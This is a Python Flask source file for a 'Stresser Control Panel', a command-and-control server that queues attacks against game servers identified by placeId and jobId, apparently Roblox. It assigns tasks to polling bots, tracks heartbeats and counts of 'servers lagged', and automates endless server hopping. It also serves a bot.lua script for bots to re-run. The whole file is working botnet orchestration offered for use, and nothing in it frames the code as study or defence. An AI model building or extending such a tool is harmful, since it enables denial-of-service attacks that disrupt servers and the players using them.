import os
import sqlite3
import threading
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
import logging

app = Flask(__name__)
CORS(app)

# Configuration
CONFIG = {
    'TASK_EXPIRY_MINUTES': 10,
    'MAX_BOTS_PER_TARGET': 50,
    'DEBUG': True
}

# SQLite setup with thread safety
DB_PATH = os.path.join(os.path.dirname(__file__), 'bots.db')
db_lock = threading.Lock()

def get_db_connection():
    return sqlite3.connect(DB_PATH, check_same_thread=False)

def init_database():
    with db_lock:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS attacks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                targetPlace TEXT NOT NULL,
                targetJob TEXT NOT NULL,
                duration INTEGER DEFAULT 60,
                status TEXT DEFAULT 'pending',
                createdAt TEXT NOT NULL,
                assignedAt TEXT,
                completedAt TEXT,
                assignedBot TEXT,
                serverHop INTEGER DEFAULT 0,
                serversLagged INTEGER DEFAULT 0
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS bots (
                botId TEXT PRIMARY KEY,
                lastPing TEXT NOT NULL,
                status TEXT DEFAULT 'offline',
                currentTarget TEXT,
                currentPlace TEXT,
                currentJob TEXT,
                attacksExecuted INTEGER DEFAULT 0,
                uptime INTEGER DEFAULT 0,
                isOnline INTEGER DEFAULT 0
            )
        ''')
        
        # Create index for faster queries
        cursor.execute('''
            CREATE INDEX IF NOT EXISTS idx_attacks_status ON attacks(status)
        ''')
        
        cursor.execute('''
            CREATE INDEX IF NOT EXISTS idx_bots_online ON bots(isOnline, status)
        ''')
        
        conn.commit()
        conn.close()

# Initialize database
init_database()

# Logging setup
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Helper functions
def cleanup_expired_attacks():
    expiry = (datetime.utcnow() - timedelta(minutes=CONFIG['TASK_EXPIRY_MINUTES'])).isoformat()
    with db_lock:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("DELETE FROM attacks WHERE status = 'pending' AND createdAt < ?", (expiry,))
        deleted = cursor.rowcount
        conn.commit()
        conn.close()
        if deleted > 0:
            logger.info(f"Cleaned up {deleted} expired attacks")

def cleanup_inactive_bots():
    # Mark bots offline if no heartbeat for 1 minute (much faster detection)
    expiry = (datetime.utcnow() - timedelta(minutes=1)).isoformat()
    try:
        conn = get_db_connection()
        conn.execute('PRAGMA busy_timeout = 1000')  # 1 second timeout
        cursor = conn.cursor()
        
        # Mark bots as offline first, then delete old records
        cursor.execute("UPDATE bots SET isOnline = 0, status = 'offline' WHERE lastPing < ?", (expiry,))
        updated = cursor.rowcount
        
        # Delete very old bot records (older than 30 minutes for faster cleanup)
        old_expiry = (datetime.utcnow() - timedelta(minutes=30)).isoformat()
        cursor.execute("DELETE FROM bots WHERE lastPing < ?", (old_expiry,))
        deleted = cursor.rowcount
        
        conn.commit()
        conn.close()
        if updated > 0:
            logger.info(f"Marked {updated} bots as offline")
        if deleted > 0:
            logger.info(f"Cleaned up {deleted} old bot records")
    except Exception as e:
        logger.error(f"Database error in cleanup_inactive_bots: {str(e)}")
        if 'conn' in locals():
            conn.close()

def get_bot_status(bot_id):
    """Get current bot status from database"""
    try:
        conn = get_db_connection()
        conn.execute('PRAGMA busy_timeout = 500')
        cursor = conn.cursor()
        cursor.execute('SELECT status FROM bots WHERE botId = ?', (bot_id,))
        result = cursor.fetchone()
        conn.close()
        return {'status': result[0]} if result else None
    except Exception as e:
        logger.error(f"Error getting bot status: {str(e)}")
        return None

def update_bot_status(bot_id, status, current_place="", current_job="", attacks_executed=0, uptime=0):
    now = datetime.utcnow().isoformat()
    is_online = 1 if status in ['online', 'attacking', 'in_server', 'lagging', 'teleporting', 'completed'] else 0
    
    # Use a shorter timeout to prevent deadlocks
    try:
        conn = get_db_connection()
        conn.execute('PRAGMA busy_timeout = 1000')  # 1 second timeout
        cursor = conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO bots (
                botId, lastPing, status, currentPlace, currentJob, 
                attacksExecuted, uptime, isOnline
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (bot_id, now, status, current_place, current_job, attacks_executed, uptime, is_online))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Database error in update_bot_status: {str(e)}")
        if 'conn' in locals():
            conn.close()

# API Endpoints

@app.route('/bot.lua')
def serve_bot_script():
    """Serve the bot script for re-execution after teleport"""
    try:
        with open('bot.lua', 'r') as f:
            script_content = f.read()
        return script_content, 200, {'Content-Type': 'text/plain'}
    except FileNotFoundError:
        return "-- Bot script not found", 404

@app.route('/')
def dashboard():
    """Stresser control dashboard"""
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Stresser Control Panel</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
            
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body { 
                font-family: 'Inter', sans-serif; 
                background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 100%);
                color: #ffffff;
                min-height: 100vh;
                overflow-x: hidden;
            }
            
            .container { 
                max-width: 1400px; 
                margin: 0 auto; 
                padding: 2rem;
                position: relative;
            }
            
            .header { 
                text-align: center; 
                margin-bottom: 3rem;
                position: relative;
            }
            
            .header::before {
                content: '';
                position: absolute;
                top: -50px;
                left: 50%;
                transform: translateX(-50%);
                width: 100px;
                height: 100px;
                background: linear-gradient(45deg, #ff0066, #ff6600);
                border-radius: 50%;
                opacity: 0.1;
                animation: pulse 2s infinite;
            }
            
            @keyframes pulse {
                0%, 100% { transform: translateX(-50%) scale(1); opacity: 0.1; }
                50% { transform: translateX(-50%) scale(1.2); opacity: 0.2; }
            }
            
            .header h1 { 
                font-size: 3.5rem;
                font-weight: 700;
                background: linear-gradient(135deg, #ff0066, #ff6600, #ffcc00);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                background-clip: text;
                margin-bottom: 0.5rem;
                text-shadow: 0 0 30px rgba(255, 0, 102, 0.3);
            }
            
            .subtitle {
                font-size: 1.2rem;
                color: #888;
                font-weight: 300;
                margin-bottom: 1rem;
            }
            
            .status-indicator {
                display: inline-flex;
                align-items: center;
                gap: 8px;
                background: rgba(0, 255, 0, 0.1);
                border: 1px solid rgba(0, 255, 0, 0.3);
                padding: 8px 16px;
                border-radius: 25px;
                font-size: 0.9rem;
            }
            
            .status-dot {
                width: 8px;
                height: 8px;
                border-radius: 50%;
                background: #00ff00;
                animation: blink 1.5s infinite;
            }
            
            @keyframes blink {
                0%, 50% { opacity: 1; }
                51%, 100% { opacity: 0.3; }
            }
            
            .stats { 
                display: grid; 
                grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); 
                gap: 2rem; 
                margin-bottom: 3rem; 
            }
            
            .stat { 
                background: rgba(255, 255, 255, 0.03);
                backdrop-filter: blur(10px);
                border: 1px solid rgba(255, 255, 255, 0.1);
                padding: 2rem;
                text-align: center;
                border-radius: 20px;
                transition: all 0.3s ease;
                position: relative;
                overflow: hidden;
            }
            
            .stat::before {
                content: '';
                position: absolute;
                top: 0;
                left: -100%;
                width: 100%;
                height: 100%;
                background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
                transition: left 0.5s;
            }
            
            .stat:hover::before {
                left: 100%;
            }
            
            .stat:hover { 
                transform: translateY(-5px);
                border-color: rgba(255, 102, 0, 0.5);
                box-shadow: 0 20px 40px rgba(255, 102, 0, 0.1);
            }
            
            .stat h3 { 
                margin-bottom: 1rem;
                color: #ff6600;
                font-size: 0.9rem;
                font-weight: 600;
                text-transform: uppercase;
                letter-spacing: 1px;
            }
            
            .stat p { 
                font-size: 3rem;
                font-weight: 700;
                color: #ffffff;
                margin-bottom: 0.5rem;
            }
            
            .stat-trend {
                font-size: 0.8rem;
                color: #888;
            }
            
            .info-section {
                background: rgba(255, 255, 255, 0.03);
                backdrop-filter: blur(10px);
                border: 1px solid rgba(255, 255, 255, 0.1);
                padding: 2rem;
                border-radius: 20px;
                margin-bottom: 2rem;
            }
            
            .info-section h3 { 
                color: #00ffff; 
                margin-bottom: 1.5rem;
                font-size: 1.5rem;
                font-weight: 600;
            }
            
            .endpoint-list {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
                gap: 1rem;
            }
            
            .endpoint {
                background: rgba(0, 0, 0, 0.3);
                padding: 1rem;
                border-radius: 10px;
                border-left: 4px solid #00ffff;
                transition: all 0.3s ease;
            }
            
            .endpoint:hover {
                background: rgba(0, 255, 255, 0.1);
                transform: translateX(5px);
            }
            
            .endpoint-method {
                font-weight: 600;
                color: #ff6600;
                margin-right: 1rem;
            }
            
            .endpoint-path {
                color: #00ffff;
                font-family: 'Courier New', monospace;
            }
            
            .endpoint-desc {
                color: #aaa;
                font-size: 0.9rem;
                margin-top: 0.5rem;
            }
            
            .footer {
                text-align: center;
                margin-top: 3rem;
                padding: 2rem;
                border-top: 1px solid rgba(255, 255, 255, 0.1);
            }
            
            .footer p {
                color: #666;
                font-size: 0.9rem;
            }
            
            @media (max-width: 768px) {
                .container { padding: 1rem; }
                .header h1 { font-size: 2.5rem; }
                .stats { grid-template-columns: 1fr; gap: 1rem; }
                .stat p { font-size: 2rem; }
            }
        </style>
        <script>
            async function fetchStats() {
                try {
                    const response = await fetch('/api/stats');
                    const data = await response.json();
                    document.getElementById('pending-attacks').textContent = data.pending_attacks;
                    document.getElementById('active-attacks').textContent = data.active_attacks;
                    document.getElementById('online-bots').textContent = data.online_bots;
                    document.getElementById('completed-attacks').textContent = data.completed_attacks;
                } catch (error) {
                    console.error('Error:', error);
                }
            }
            
            async function clearAttacks() {
                if (confirm('Clear all pending attacks?')) {
                    await fetch('/api/clear-attacks', { method: 'POST' });
                    fetchStats();
                }
            }
            
            setInterval(fetchStats, 5000); // Reduced frequency to prevent server overload
            window.onload = fetchStats;
        </script>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>STRESSER CONTROL</h1>
                <p class="subtitle">Advanced Bot Management System</p>
                <div class="status-indicator">
                    <div class="status-dot"></div>
                    System Online
                </div>
            </div>
            
            <div class="stats">
                <div class="stat">
                    <h3>Pending Attacks</h3>
                    <p id="pending-attacks">-</p>
                    <div class="stat-trend">Queued Tasks</div>
                </div>
                <div class="stat">
                    <h3>Active Attacks</h3>
                    <p id="active-attacks">-</p>
                    <div class="stat-trend">Currently Running</div>
                </div>
                <div class="stat">
                    <h3>Online Bots</h3>
                    <p id="online-bots">-</p>
                    <div class="stat-trend">Ready for Action</div>
                </div>
                <div class="stat">
                    <h3>Completed</h3>
                    <p id="completed-attacks">-</p>
                    <div class="stat-trend">Total Finished</div>
                </div>
            </div>
            
            <div class="info-section">
                <h3>System Information</h3>
                <div class="endpoint-list">
                    <div class="endpoint">
                        <span class="endpoint-method">GET</span>
                        <span class="endpoint-path">/health</span>
                        <div class="endpoint-desc">API health and status check</div>
                    </div>
                    <div class="endpoint">
                        <span class="endpoint-method">GET</span>
                        <span class="endpoint-path">/</span>
                        <div class="endpoint-desc">Control dashboard</div>
                    </div>
                </div>
            </div>
            
            <div class="footer">
                <p>Advanced Stresser Bot System v3.0 | Built for Performance</p>
            </div>
        </div>
    </body>
</html>
    '''
    return html

@app.route('/queue-task', methods=['POST'])
def launch_attack():
    try:
        data = request.json
        if not data:
            return jsonify({'error': 'No attack data provided'}), 400
            
        target_place = str(data.get('placeId', ''))
        target_job = str(data.get('jobId', ''))
        duration = int(data.get('duration', 60))
        server_hop = bool(data.get('serverHop', False))
        
        if not target_place or not target_job:
            return jsonify({'error': 'Missing target information'}), 400
        
        cleanup_expired_attacks()
        
        with db_lock:
            conn = get_db_connection()
            cursor = conn.cursor()
            now = datetime.utcnow().isoformat()
            
            cursor.execute('''
                INSERT INTO attacks (targetPlace, targetJob, duration, status, createdAt, serverHop)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (target_place, target_job, duration, 'pending', now, int(server_hop)))
            
            attack_id = cursor.lastrowid
            conn.commit()
            conn.close()
        
        logger.info(f"Attack launched: {attack_id} -> {target_place} for {duration}s")
        
        return jsonify({
            'success': True,
            'taskId': attack_id,
            'message': 'Attack launched successfully',
            'target': target_place,
            'duration': duration
        })
        
    except Exception as e:
        logger.error(f"Error launching attack: {str(e)}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/get-task', methods=['GET'])
def get_target():
    try:
        bot_id = request.args.get('botId')
        if not bot_id:
            return jsonify({'error': 'Bot ID required'}), 400
        
        cleanup_expired_attacks()
        cleanup_inactive_bots()
        
        # Remove db_lock to prevent deadlocks
        conn = get_db_connection()
        conn.execute('PRAGMA busy_timeout = 1000')  # 1 second timeout
        cursor = conn.cursor()
        
        # Check if bot already has an assigned task
        cursor.execute('''
            SELECT * FROM attacks 
            WHERE assignedBot = ? AND status = 'assigned'
        ''', (bot_id,))
        existing_task = cursor.fetchone()
        
        if existing_task:
            conn.close()
            return jsonify({
                'task': {
                    'taskId': existing_task[0],
                    'type': 'join_game',
                    'placeId': existing_task[1],
                    'jobId': existing_task[2],
                    'duration': existing_task[3],
                    'serverHop': bool(existing_task[9]) if len(existing_task) > 9 else False
                }
            })
        
        # Get next pending attack
        cursor.execute('''
            SELECT * FROM attacks 
            WHERE status = 'pending' 
            ORDER BY createdAt ASC 
            LIMIT 1
        ''')
        attack = cursor.fetchone()
        
        if attack:
            attack_id = attack[0]
            now = datetime.utcnow().isoformat()
            
            # Mark attack as assigned to this bot
            cursor.execute('''
                UPDATE attacks SET status = 'assigned', assignedAt = ?, assignedBot = ?
                WHERE id = ?
            ''', (now, bot_id, attack_id))
            
            conn.commit()
            conn.close()
            
            # Update bot status
            update_bot_status(bot_id, 'attacking', attack[1], attack[2])
            
            logger.info(f"Attack {attack_id} assigned to bot {bot_id} - Target: {attack[1]} Duration: {attack[3]}s")
            
            return jsonify({
                'task': {
                    'taskId': attack_id,
                    'type': 'join_game',
                    'placeId': attack[1],
                    'jobId': attack[2],
                    'duration': attack[3],
                    'serverHop': bool(attack[9]) if len(attack) > 9 else False
                }
            })
        else:
            conn.close()
            # Update bot status to online (idle) only if not currently lagging
            current_bot = get_bot_status(bot_id)
            if current_bot and current_bot.get('status') not in ['lagging', 'attacking', 'teleporting']:
                update_bot_status(bot_id, 'online')
            return jsonify({'task': None})
        
    except Exception as e:
        logger.error(f"Error getting target: {str(e)}")
        if 'conn' in locals():
            conn.close()
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/bot-heartbeat', methods=['POST'])
def bot_ping():
    try:
        data = request.json
        if not data:
            return jsonify({'error': 'No data provided'}), 400
            
        bot_id = data.get('botId', 'unknown')
        status = data.get('status', 'offline')
        current_place = data.get('currentPlace')
        current_job = data.get('currentJob')
        attacks_executed = data.get('attacksExecuted', 0)
        uptime = data.get('uptime', 0)
        
        update_bot_status(bot_id, status, current_place, current_job, attacks_executed, uptime)
        
        # If bot completed an attack, mark it as completed
        if status == 'completed':
            try:
                conn = get_db_connection()
                conn.execute('PRAGMA busy_timeout = 1000')  # 1 second timeout
                cursor = conn.cursor()
                now = datetime.utcnow().isoformat()
                
                # First check if there's an assigned attack for this bot
                cursor.execute('SELECT id FROM attacks WHERE assignedBot = ? AND status = ?', (bot_id, 'assigned'))
                attack = cursor.fetchone()
                
                if attack:
                    cursor.execute('''
                        UPDATE attacks SET status = 'completed', completedAt = ? 
                        WHERE assignedBot = ? AND status = 'assigned'
                    ''', (now, bot_id))
                    updated = cursor.rowcount
                    conn.commit()
                    logger.info(f"Bot {bot_id} completed attack - Updated {updated} attack records")
                else:
                    logger.warning(f"Bot {bot_id} sent completed status but no assigned attack found")
                
                conn.close()
            except Exception as e:
                logger.error(f"Error marking attack completed: {str(e)}")
                if 'conn' in locals():
                    conn.close()
        
        return jsonify({'success': True, 'message': 'Heartbeat received'})
        
    except Exception as e:
        logger.error(f"Error processing bot heartbeat: {str(e)}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/server-hop-complete', methods=['POST'])
def server_hop_complete():
    """Handle server hop completion - increment servers lagged count and create new task if infinite hopping"""
    try:
        data = request.json
        if not data:
            return jsonify({'error': 'No data provided'}), 400
            
        bot_id = data.get('botId', 'unknown')
        task_id = data.get('taskId')
        
        if not task_id:
            return jsonify({'error': 'Task ID required'}), 400
        
        conn = get_db_connection()
        conn.execute('PRAGMA busy_timeout = 1000')
        cursor = conn.cursor()
        
        # Get the current attack details
        cursor.execute('SELECT * FROM attacks WHERE id = ?', (task_id,))
        attack = cursor.fetchone()
        
        if not attack:
            conn.close()
            return jsonify({'error': 'Attack not found'}), 404
        
        # Increment servers lagged count
        current_servers_lagged = attack[10] if len(attack) > 10 else 0
        new_servers_lagged = current_servers_lagged + 1
        
        # Update the attack record
        cursor.execute('''
            UPDATE attacks SET serversLagged = ? WHERE id = ?
        ''', (new_servers_lagged, task_id))
        
        is_server_hop = bool(attack[9]) if len(attack) > 9 else False
        
        # If server hopping is enabled, create a new task for infinite hopping
        if is_server_hop:
            # Mark current attack as completed
            now = datetime.utcnow().isoformat()
            cursor.execute('''
                UPDATE attacks SET status = 'completed', completedAt = ? WHERE id = ?
            ''', (now, task_id))
            
            # Create new attack for server hopping (with random jobId to force random server)
            cursor.execute('''
                INSERT INTO attacks (targetPlace, targetJob, duration, status, createdAt, serverHop, assignedBot, assignedAt)
                VALUES (?, ?, ?, 'assigned', ?, ?, ?, ?)
            ''', (attack[1], 'random', attack[3], now, 1, bot_id, now))
            
            new_task_id = cursor.lastrowid
            conn.commit()
            conn.close()
            
            logger.info(f"Server hop completed for bot {bot_id} - Servers lagged: {new_servers_lagged} - Created new task: {new_task_id}")
            
            return jsonify({
                'success': True,
                'serversLagged': new_servers_lagged,
                'newTask': {
                    'taskId': new_task_id,
                    'type': 'join_game',
                    'placeId': attack[1],
                    'jobId': 'random',
                    'duration': attack[3],
                    'serverHop': True
                }
            })
        else:
            # Just mark as completed for normal attacks
            now = datetime.utcnow().isoformat()
            cursor.execute('''
                UPDATE attacks SET status = 'completed', completedAt = ? WHERE id = ?
            ''', (now, task_id))
            
            conn.commit()
            conn.close()
            
            logger.info(f"Attack completed for bot {bot_id} - Servers lagged: {new_servers_lagged}")
            
            return jsonify({
                'success': True,
                'serversLagged': new_servers_lagged,
                'newTask': None
            })
        
    except Exception as e:
        logger.error(f"Error processing server hop complete: {str(e)}")
        if 'conn' in locals():
            conn.close()
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/api/stats', methods=['GET'])
def get_stats():
    try:
        # Remove db_lock to prevent deadlocks, use timeout instead
        conn = get_db_connection()
        conn.execute('PRAGMA busy_timeout = 500')  # 500ms timeout
        cursor = conn.cursor()
        
        cursor.execute("SELECT COUNT(*) FROM attacks WHERE status = 'pending'")
        pending_attacks = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM attacks WHERE status = 'assigned'")
        active_attacks = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM bots WHERE isOnline = 1")
        online_bots = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM attacks WHERE status = 'completed'")
        completed_attacks = cursor.fetchone()[0]
        
        # Get total servers lagged count (sum of serversLagged from all completed attacks)
        cursor.execute("SELECT COALESCE(SUM(serversLagged), 0) FROM attacks WHERE status = 'completed'")
        servers_lagged = cursor.fetchone()[0]
        
        conn.close()
        
        return jsonify({
            'status': 'online',
            'pending_attacks': pending_attacks,
            'active_attacks': active_attacks,
            'online_bots': online_bots,
            'completed_attacks': completed_attacks,
            'servers_lagged': servers_lagged,
            'config': CONFIG
        })
        
    except Exception as e:
        logger.error(f"Error getting stats: {str(e)}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/stop-attacks', methods=['POST'])
def stop_attacks():
    """Stop all active attacks immediately and reset stuck bots"""
    try:
        with db_lock:
            conn = get_db_connection()
            cursor = conn.cursor()
            now = datetime.utcnow().isoformat()
            
            # Mark all assigned/active attacks as completed
            cursor.execute('''
                UPDATE attacks SET status = 'completed', completedAt = ? 
                WHERE status IN ('assigned', 'pending')
            ''', (now,))
            stopped = cursor.rowcount
            
            # Mark all attacking bots as online, including teleporting ones
            cursor.execute('''
                UPDATE bots SET status = 'online' 
                WHERE status IN ('attacking', 'lagging', 'teleporting', 'TELEPORTING', 'in_server')
            ''')
            bots_reset = cursor.rowcount
            
            conn.commit()
            conn.close()
        
        logger.info(f"Stopped {stopped} attacks and reset {bots_reset} bots to online status")
        return jsonify({
            'success': True, 
            'stopped': stopped, 
            'bots_reset': bots_reset,
            'message': 'All attacks stopped and bots reset'
        })
        
    except Exception as e:
        logger.error(f"Error stopping attacks: {str(e)}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/api/clear-attacks', methods=['POST'])
def clear_attacks():
    try:
        with db_lock:
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute("DELETE FROM attacks WHERE status = 'pending'")
            cleared = cursor.rowcount
            conn.commit()
            conn.close()
        
        logger.info(f"Cleared {cleared} pending attacks")
        return jsonify({'success': True, 'cleared': cleared})
        
    except Exception as e:
        logger.error(f"Error clearing attacks: {str(e)}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/bot-sync', methods=['POST'])
def bot_sync():
    """Combined heartbeat and task retrieval endpoint - reduces API calls by 50%"""
    try:
        data = request.json
        if not data:
            return jsonify({'error': 'No data provided'}), 400
            
        bot_id = data.get('botId', 'unknown')
        status = data.get('status', 'offline')
        current_place = data.get('currentPlace')
        current_job = data.get('currentJob')
        attacks_executed = data.get('attacksExecuted', 0)
        uptime = data.get('uptime', 0)
        
        # Update bot status (heartbeat part)
        update_bot_status(bot_id, status, current_place, current_job, attacks_executed, uptime)
        
        # Handle completed attacks
        if status == 'completed':
            try:
                conn = get_db_connection()
                conn.execute('PRAGMA busy_timeout = 1000')
                cursor = conn.cursor()
                now = datetime.utcnow().isoformat()
                
                cursor.execute('SELECT id FROM attacks WHERE assignedBot = ? AND status = ?', (bot_id, 'assigned'))
                attack = cursor.fetchone()
                
                if attack:
                    cursor.execute('''
                        UPDATE attacks SET status = 'completed', completedAt = ? 
                        WHERE assignedBot = ? AND status = 'assigned'
                    ''', (now, bot_id))
                    updated = cursor.rowcount
                    conn.commit()
                    logger.info(f"Bot {bot_id} completed attack - Updated {updated} attack records")
                else:
                    logger.warning(f"Bot {bot_id} sent completed status but no assigned attack found")
                
                conn.close()
            except Exception as e:
                logger.error(f"Error marking attack completed: {str(e)}")
                if 'conn' in locals():
                    conn.close()
        
        # Task retrieval part (only if bot is online and not lagging)
        task = None
        if status == 'online':
            cleanup_expired_attacks()
            
            try:
                conn = get_db_connection()
                conn.execute('PRAGMA busy_timeout = 1000')
                cursor = conn.cursor()
                
                # Check if bot already has an assigned task
                cursor.execute('''
                    SELECT * FROM attacks 
                    WHERE assignedBot = ? AND status = 'assigned'
                ''', (bot_id,))
                existing_task = cursor.fetchone()
                
                if existing_task:
                    task = {
                        'taskId': existing_task[0],
                        'type': 'join_game',
                        'placeId': existing_task[1],
                        'jobId': existing_task[2],
                        'duration': existing_task[3]
                    }
                else:
                    # Get next pending attack
                    cursor.execute('''
                        SELECT * FROM attacks 
                        WHERE status = 'pending' 
                        ORDER BY createdAt ASC 
                        LIMIT 1
                    ''')
                    attack = cursor.fetchone()
                    
                    if attack:
                        attack_id = attack[0]
                        now = datetime.utcnow().isoformat()
                        
                        # Mark attack as assigned to this bot
                        cursor.execute('''
                            UPDATE attacks SET status = 'assigned', assignedAt = ?, assignedBot = ?
                            WHERE id = ?
                        ''', (now, bot_id, attack_id))
                        
                        conn.commit()
                        
                        # Update bot status to attacking
                        update_bot_status(bot_id, 'attacking', attack[1], attack[2])
                        
                        logger.info(f"Attack {attack_id} assigned to bot {bot_id} - Target: {attack[1]} Duration: {attack[3]}s")
                        
                        task = {
                            'taskId': attack_id,
                            'type': 'join_game',
                            'placeId': attack[1],
                            'jobId': attack[2],
                            'duration': attack[3]
                        }
                
                conn.close()
            except Exception as e:
                logger.error(f"Error getting task for bot {bot_id}: {str(e)}")
                if 'conn' in locals():
                    conn.close()
        
        return jsonify({
            'success': True, 
            'message': 'Sync completed',
            'task': task
        })
        
    except Exception as e:
        logger.error(f"Error in bot sync: {str(e)}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/health', methods=['GET'])
def health():
    return get_stats()

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(
        debug=CONFIG['DEBUG'], 
        port=port,
        host='0.0.0.0'  # Allow external connections for deployment
    )
